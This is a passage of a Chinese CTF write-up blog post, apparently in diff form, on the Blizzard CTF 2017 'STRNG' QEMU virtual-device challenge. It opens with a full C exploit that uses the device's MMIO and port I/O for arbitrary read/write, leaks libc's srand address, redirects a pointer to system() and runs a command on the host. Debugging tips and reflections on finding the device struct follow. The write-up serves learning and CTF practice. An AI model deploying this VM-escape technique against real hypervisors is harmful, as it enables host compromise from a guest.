+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/io.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=cp>#define MAP_SIZE 4096
+</span><span class=cp></span>
+<span class=kt>uint8_t</span> <span class=o>*</span><span class=n>mmio_mem</span><span class=p>;</span>
+<span class=kt>uint32_t</span> <span class=n>pmio_base</span> <span class=o>=</span> <span class=mh>0xc050</span><span class=p>;</span>
+
+<span class=kt>char</span> <span class=o>*</span><span class=n>mmio_path</span> <span class=o>=</span> <span class=s>&#34;/sys/devices/pci0000:00/0000:00:03.0/resource0&#34;</span><span class=p>;</span>
+
+<span class=kt>void</span> <span class=nf>die</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>msg</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>perror</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
+    <span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>uint32_t</span> <span class=nf>mmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>return</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>));</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>mmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>))</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>uint32_t</span> <span class=nf>pmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=n>inl</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>pmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>outl</span><span class=p>(</span><span class=n>value</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>uint32_t</span> <span class=nf>arb_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>0</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
+    <span class=k>return</span> <span class=n>pmio_read</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>4</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>arb_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>0</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
+    <span class=n>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span> <span class=n>value</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+<span class=p>{</span>
+    <span class=c1>// change I/O privilege level
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>iopl</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
+        <span class=n>die</span><span class=p>(</span><span class=s>&#34;iopl failed&#34;</span><span class=p>);</span>
+    
+    <span class=c1>// mmap device mmio space
+</span><span class=c1></span>    <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
+    <span class=k>if</span> <span class=p>((</span><span class=n>fd</span><span class=o>=</span><span class=n>open</span><span class=p>(</span><span class=n>mmio_path</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_SYNC</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>perror</span><span class=p>(</span><span class=s>&#34;open device mmio failed&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=n>mmio_mem</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>MAP_SIZE</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>mmio_mem</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>perror</span><span class=p>(</span><span class=s>&#34;mmap failed&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+    <span class=p>}</span>
+    
+    <span class=cm>/*
+</span><span class=cm>    $ python3
+</span><span class=cm>    &gt;&gt;&gt; from pwn import *
+</span><span class=cm>    &gt;&gt;&gt; list(map(hex, unpack_many(b&#34;cat /root/flag  &#34;)))   # string align with 4
+</span><span class=cm>    [&#39;0x20746163&#39;, &#39;0x6f6f722f&#39;, &#39;0x6c662f74&#39;, &#39;0x20206761&#39;]
+</span><span class=cm>    */</span>
+    <span class=n>mmio_write</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span> <span class=mh>0x20746163</span><span class=p>);</span>
+    <span class=n>mmio_write</span><span class=p>(</span><span class=mh>0xc</span><span class=p>,</span> <span class=mh>0x6f6f722f</span><span class=p>);</span>
+    <span class=n>mmio_write</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x6c662f74</span><span class=p>);</span>
+    <span class=n>mmio_write</span><span class=p>(</span><span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x20206761</span><span class=p>);</span>
+    
+    <span class=c1>// mmio_write(0x8, 0x20006873);    // system(&#34;sh&#34;); freeze after print &#34;sh: turning off NDELAY mode&#34;
+</span><span class=c1></span>
+    <span class=kt>uint64_t</span> <span class=n>srand_addr</span> <span class=o>=</span> <span class=n>arb_read</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
+    <span class=n>srand_addr</span> <span class=o>=</span> <span class=p>(</span><span class=n>arb_read</span><span class=p>(</span><span class=mh>0x104</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>srand_addr</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>));</span>
+    <span class=kt>uint64_t</span> <span class=n>system_addr</span> <span class=o>=</span> <span class=n>srand_addr</span> <span class=o>+</span> <span class=mh>0xac50</span><span class=p>;</span>
+
+    <span class=n>arb_write</span><span class=p>(</span><span class=mh>0x114</span><span class=p>,</span> <span class=n>system_addr</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>);</span>
+
+    <span class=n>mmio_write</span><span class=p>(</span><span class=mh>0xc</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+    
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=tips>tips</h2>
+<p>打印struct偏移</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>gdb&gt; print <span class=o>(</span>int<span class=o>)</span><span class=p>&amp;</span><span class=o>((</span>STRNGState*<span class=o>)</span>0<span class=o>)</span>-&gt;srand
+gdb&gt; ptype /o STRNGState
+pwndbg&gt; dt STRNGState
+</code></pre></td></tr></table>
+</div>
+</div><p>pahole导出elf中的structs</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ sudo apt install dwarves
+$ pahole -V qemu-system-x86_64 &gt; structs  <span class=c1># 导出并不完全，STRNGState不会被找到，是因为typedef的原因？</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=后记>后记</h2>
+<p>要做出来STRNG这道题目，很关键的一点就是发现STRNGState结构体，知道了这个，那几个read、write函数就没有那么抽象了，漏洞也很清晰明了，所以这是很关键的问题。但是我看的几个WriteUp都没有说如何确定的这个结构。这可能就是比赛时solves: 0的原因吧。</p>
+<p>尝试一：以state为关键字，在ida的structures标签页中搜索结构体，搜不到。</p>
+<p>尝试二：使用pahole导出struct，也没有</p>
+<p>后来看源码发现这个结构体是被<code>typedef</code>成了STRNDState的名字，本身并没有名字，这是不是上面找不到的原因？</p>
+<p>(PS: disqus判定评论是否为spam的检查太垃圾了，在raycp大佬文章下面发了两个评论询问这个问题，都被这个gdx屏蔽了)</p>
+<p><br></p>
+<p>前期花了太多的时间想彻底搞明白qemu虚拟设备的创建(经常会有这种莫名的强迫症&mldr;)，但是看来看去都模模糊糊的，是真的菜啊我。察觉这个状态后，想起教主的“先干起来，慢慢补充”，才继续关注题目本身。其实看两个简单的虚拟设备例子，做这个题目就没问题了。</p>
+<blockquote>
+<p>2020-11-28</p>
+<p>在ida的local types窗口可以检索到STRNGState</p>
+</blockquote>
+<h2 id=reference>Reference</h2>
+<ol>
+<li><a href=https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge>qemu-pwn-基础知识</a></li>
+<li><a href=https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup>qemu pwn-Blizzard CTF 2017 Strng writeup</a></li>
+<li><a href=https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html>BlizzardCTF 2017 - Strng</a></li>
+<li><a href=https://wiki.osdev.org/PCI#Base_Address_Registers>osdev PCI BAR</a></li>
+<li><a href=https://www.cnblogs.com/machangwei-8/p/10403495.html>lspci命令详解</a></li>
+</ol>
+</div>
+<div class=post-copyright>
+<p class=copyright-item>
+<span class=item-title>文章作者</span>
+<span class=item-content>hhdx</span>
+</p>
+<p class=copyright-item>
+<span class=item-title>上次更新</span>
+<span class=item-content>
+2020-11-23
+</span>
+</p>
+</div>
+<footer class=post-footer>
+<div class=post-tags>
+<a href=/tags/ctf/>CTF</a>
+<a href=/tags/qemu/>Qemu</a>
+</div>
+<nav class=post-nav>
+<a class=prev href=/post/virtio-intro/>
+<i class="iconfont icon-left"></i>
+<span class="prev-text nav-default">【翻译】Virtio：一种Linux I/O虚拟化框架</span>
+<span class="prev-text nav-mobile">上一篇</span>
+</a>
+<a class=next href=/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/>
+<span class="next-text nav-default">Kernel Pwn: 从入门到入土</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i>
+</a>
+</nav>
+</footer>
+</article>
+</div>
+<div id=disqus_thread></div>
+<script type=text/javascript>(function(){var a,b;if(window.location.hostname==='localhost')return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='lyliuchao',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+</div>
+</main>
+<footer id=footer class=footer>
+<div class=social-links>
+<a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
+<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a>
+<a href=https://hhdx.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a>
+</div>
+<div class=copyright>
+<span class=power-by>
+由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
+</span>
+<span class=division>|</span>
+<span class=theme-info>
+主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
+</span>
+<span class=copyright-year>
+&copy;
+2016 -
+2021<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span>
+</span>
+</div>
+</footer>
+<div class=back-to-top id=back-to-top>
+<i class="iconfont icon-up"></i>
+</div>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-177325662-1','auto'),ga('set','anonymizeIp',!0),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</body>
+</html>
